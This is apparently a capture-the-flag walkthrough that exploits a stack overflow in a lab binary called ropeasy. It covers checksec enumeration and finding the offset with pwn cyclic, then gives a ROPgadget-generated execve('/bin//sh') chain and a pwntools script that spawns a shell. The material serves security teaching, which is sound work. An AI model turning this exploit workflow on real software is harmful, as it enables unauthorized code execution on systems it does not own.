# Easy ROP challenge  

## Intro 
Some prerequisites:  
* Some understanding of reverse engineering
* Competent at using a debugger such as Radare2, GDB, Ghidra, etc
* Basic understanding of linux binaries

We'll be treating the ropeasy binary as an unknown binary, we have no context of what it does or how to exploit it. Like all things in hacking, we start with enumeration.  
Tools like [checksec](https://docs.pwntools.com/en/stable/commandline.html) can help us indenify potential attack vectors and understand where we might want to start:  

![checksecOutput](https://user-images.githubusercontent.com/65077960/127680041-8f0ecfcc-d9e4-47be-8673-6cc3966e39de.png)

We're currently itneresting in "No canary found". Typically a random value is generated at program initialization and inserted at the end of the high risk area where the stack overflows.
At the end of the function, it checks to see if the value has been modified. The binary is also statically linked, so we can assume the gadgets are available to us.  

## Using it as intended

Our first test is typically to run the binary and use it as intended. Look for inputs and outputs, understand how the binary might work:  
![image](https://user-images.githubusercontent.com/65077960/127681942-de961813-665b-4959-acd3-da4673c8c445.png)

![image](https://user-images.githubusercontent.com/65077960/127681981-32fa2a07-95b4-4181-bddb-7f23d13b564e.png)

If our input is too large, we get a segmentation fault:  
![image](https://user-images.githubusercontent.com/65077960/127682045-57738d79-a39a-4e9f-a7d0-f71b83a6d8de.png)

## Finding the offset
Pwn has a tool that we can u se to generate large strings and compare them to get the offset:  
```
! pwn cyclic 200
```
You'lkl be given output that looks like this:  
```
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
```
We run the program (just type run) and provide the string as the input and receive another SIGSEV. We calculate the offset with the value in the ESP register:
```
x/xw $esp
```
and pass it to pwn:  
```
! pwn cyclic -l <ESP Value>
```
exit out and use:
```
ROPgadget --ropchain --binary ropeasy_updated
```
We're given a python payload as output (in step 5):  
```py
#!/usr/bin/env python2
# execve generated by ROPgadget

from struct import pack

# Padding goes here
p = ''

p += pack('<I', 0x0806feaa) # pop edx ; ret
p += pack('<I', 0x080eb060) # @ .data
p += pack('<I', 0x080b94a6) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x080558ab) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806feaa) # pop edx ; ret
p += pack('<I', 0x080eb064) # @ .data + 4
p += pack('<I', 0x080b94a6) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x080558ab) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806feaa) # pop edx ; ret
p += pack('<I', 0x080eb068) # @ .data + 8
p += pack('<I', 0x08049583) # xor eax, eax ; ret
p += pack('<I', 0x080558ab) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481d1) # pop ebx ; ret
p += pack('<I', 0x080eb060) # @ .data
p += pack('<I', 0x0806fed1) # pop ecx ; pop ebx ; ret
p += pack('<I', 0x080eb068) # @ .data + 8
p += pack('<I', 0x080eb060) # padding without overwrite ebx
p += pack('<I', 0x0806feaa) # pop edx ; ret
p += pack('<I', 0x080eb068) # @ .data + 8
p += pack('<I', 0x08049583) # xor eax, eax ; ret
p += pack('<I', 0x0807b48f) # inc eax ; ret
p += pack('<I', 0x0807b48f) # inc eax ; ret
p += pack('<I', 0x0807b48f) # inc eax ; ret
p += pack('<I', 0x0807b48f) # inc eax ; ret
p += pack('<I', 0x0807b48f) # inc eax ; ret
p += pack('<I', 0x0807b48f) # inc eax ; ret
p += pack('<I', 0x0807b48f) # inc eax ; ret
p += pack('<I', 0x0807b48f) # inc eax ; ret
p += pack('<I', 0x0807b48f) # inc eax ; ret
p += pack('<I', 0x0807b48f) # inc eax ; ret
p += pack('<I', 0x0807b48f) # inc eax ; ret
p += pack('<I', 0x0806da85) # int 0x80
```

With this, we  can make a python script to exploit the binary:  
> Run with python2.7
```py
import sys
from pwn import *
from subprocess import Popen, PIPE
context.log_level = "DEBUG"
# Run the binary and conenct to it at 127.0.0.1:1337

def main():
    # Create process and cause seg fault
    proc = process(context.binary.path)
    proc.sendline(cyclic(1024))
    proc.wait()
    proc.close()
    # Get dump core and find offset
    core = Coredump("./core")
    offset = cyclic_find(core.fault_addr)
    log.info("OFFSET: {}".format(offset))
    # Generate exploit code with ROPgadget
    STDOUT = Popen(["ROPgadget", "--ropchain", "--binary", context.binary.path], stdout=PIPE).communicate()[0]
    code = STDOUT[STDOUT.find("#!"):].replace("\t", "")
    log.info("Executing: \n" + code)
    # Execute exploit to get ropchain var
    exec(code)
    ropchain = p
    log.info("ROPChain Built: " + ropchain)
    # Spawn interactive shell
    proc = process(context.binary.path)
    proc.sendline(fit({offset:ropchain}))
    proc.interactive()
    proc.close()

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: {} <binary> <addr:port>".format(sys.argv[0]))
        sys.exit()
    context.binary = sys.argv[1]
    addr = sys.argv[2].split(":")
    main()
```
